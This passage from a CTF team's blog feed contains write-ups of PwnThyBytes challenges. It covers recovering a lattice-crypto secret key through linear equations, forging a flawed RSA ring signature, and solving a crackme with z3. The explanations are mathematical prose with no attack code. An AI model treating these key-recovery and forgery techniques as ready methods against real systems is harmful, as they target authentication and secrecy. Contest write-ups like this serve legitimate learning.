&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j}\right)x^i - 1486\sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^{i-256} + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j}\right)x^i - 1486\sum_{i=0}^{254}\left(\sum_{j=i+1}^{255} a_{kj}s_{i-j+256}\right)x^{i} + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j} - 1486 \sum_{j=i+1}^{255} a_{kj}s_{i-j+256} + e_i\right)x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i\right)x^i
\end{aligned}\]&lt;/span&gt;&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Explanations:&lt;/strong&gt;
Under modulo $p(x)$, $x^{256} = -1486$ - so we have $$\sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^i = - 1486\sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^{i-256}.$$
&lt;/div&gt;
  

&lt;p&gt;Very complicated right? Yes... But we have a conclusion for this part:&lt;/p&gt;

&lt;div class=&#34;alert success&#34;&gt;
  For each $i = 0, 1, &amp;hellip;, 255$ and $k = 1, 2, &amp;hellip;, 8$, we have:
$$b_{ki} = \sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i.$$
&lt;/div&gt;
  

&lt;h4 id=&#34;part-ii-an-insight&#34;&gt;Part II: An insight&lt;/h4&gt;

&lt;p&gt;I have noticed that the coefficients for $x^{240}, x^{241}, ..., x^{255}$ in the error polynomial would be very small (less than 0.1 in magnitude). So why don&#39;t we compare the coefficients directly?&lt;/p&gt;

&lt;p&gt;For each $i = 240, 241, ..., 255$ and $k = 1, 2, ..., 8$, we have a corresponding equation:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\text{round}(b_{ki}) = \sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \sum_{j=i+1}^{255} a_{k,i-j+256}s_j.\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Since there are 256 unknowns ($s_0, s_1, ..., s_{255}$) and 256 equations, we can hopefully solve the equation. This gives us the key, hence the flag.&lt;/p&gt;

&lt;h2 id=&#34;lotr-cryptanalysis-936-points&#34;&gt;LOTR (Cryptanalysis; 936 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-3&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;This is an attempt to implement an anonymous signature scheme using RSA. In short, given $m$ parties with public keys being $n_1, n_2, ..., n_m$, the signature generated by this group is defined by $(c_1, c_2, ..., c_m)$, where&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\sum_{k=1}^m \text{RSAEncrypt}(c_k, n_k)\equiv\text{hash}\ (\text{mod}\ 2^{256}),\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;and $2^{2175} + 2^{2048} \leq c_k \leq 2^{2176} - 2^{2048}$ for each of the $k$&#39;s.&lt;/p&gt;

&lt;p&gt;There is a catch: if $c = qn + r$ with $0 \leq r &amp;lt; q$, $\text{RSAEncrypt}(c, n) = qn + [r^e\ (\text{mod}\ n)]$.&lt;/p&gt;

&lt;h3 id=&#34;solution-3&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-simplify-the-challenge-as-much-as-possible&#34;&gt;Part I: Simplify the challenge &lt;em&gt;as much as possible&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;$\text{RSAEncrypt}(qn + r, n) = qn + [r^e\ (\text{mod}\ n)]$ is cumbersome. Why don&#39;t we just assume $r = 0$ so that $\text{RSAEncrypt}$ is just an identity function?&lt;/p&gt;

&lt;h4 id=&#34;part-ii-the-main-dish&#34;&gt;Part II: The main dish&lt;/h4&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Note:&lt;/strong&gt; The $c_k$ and $c_k&#39;$ defined below are multiples of $n_k$. This is what we had from the above part for the simplicity&amp;rsquo;s sake.
&lt;/div&gt;
  

&lt;p&gt;My approach is to generate two ciphertexts, namely, $c_k$ and $c_k&#39;$ for the $k$-th party. In this way, we have 243 ciphertext pairs. We are looking for $x_1, x_2, ..., x_{243}\in{0, 1}$ such that&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\bigoplus_{k=1}^m [(1 - x_k) \text{RSAEncrypt}(c_k, n_k) + x_k \text{RSAEncrypt}(c_k&#39;, n_k)] \equiv \text{hash}\ (\text{mod}\ 2^{256}).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Simplifying, we have:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\bigoplus_{k=1}^m [x_k (c_k - c_k&#39;)] \equiv \text{hash} \oplus \bigoplus_{k=1}^m c_k\ (\text{mod}\ 2^{256}).\]&lt;/span&gt;&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Idea:&lt;/strong&gt; My approach is to check if one of the $2^{243}$ possible generated ciphertexts covers the target hash. If not, generate another set.
&lt;/div&gt;
  

&lt;p&gt;The above equation is just an linear equation! Solving it we had the values of $x_k$&#39;s. If $x_k = 0$ we pick $c_k$, and $c_k&#39;$ otherwise. After all we have forged a signature.&lt;/p&gt;

&lt;h2 id=&#34;primitive-obsession-reverse-engineering-936-points&#34;&gt;Primitive Obsession (Reverse Engineering; 936 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-4&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;This is a crackme with a 260-byte long input. Conditions involves basic math operations after casting some of the bytes into various types.&lt;/p&gt;

&lt;h3 id=&#34;solution-4&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;My first thought is to use Angr! Unfortunately I am not a good Angr user - so it took me a long while to give up. I have finally adopted an &lt;em&gt;ultra-naive&lt;/em&gt; approach...&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2019-10-02-pwnthybytes/ida.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;That is, I have extracted the expressions one by one &lt;em&gt;manually&lt;/em&gt; and pass them to z3. After all, I admit my stupidity - it took me &lt;em&gt;six&lt;/em&gt; hours to solve it...&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
